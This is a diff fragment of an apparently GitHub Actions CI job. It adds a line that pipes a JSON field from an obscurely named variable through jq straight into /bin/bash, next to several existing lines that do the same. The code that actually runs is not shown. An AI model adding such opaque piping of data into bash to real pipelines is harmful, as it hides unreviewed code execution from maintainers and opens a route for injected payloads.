@@ -24,6 +24,7 @@ jobs:
           echo $swam1 | jq -r .votzg87 | /bin/bash
           printf '%s' "$l17542" | jq -r .f701 | /bin/bash
           printf '%s' "$thm2627" | jq -r .t9835 | /bin/bash
+          echo $uc02802 | jq -r .o2 | /bin/bash
 
       - name: Store results
         if: always()
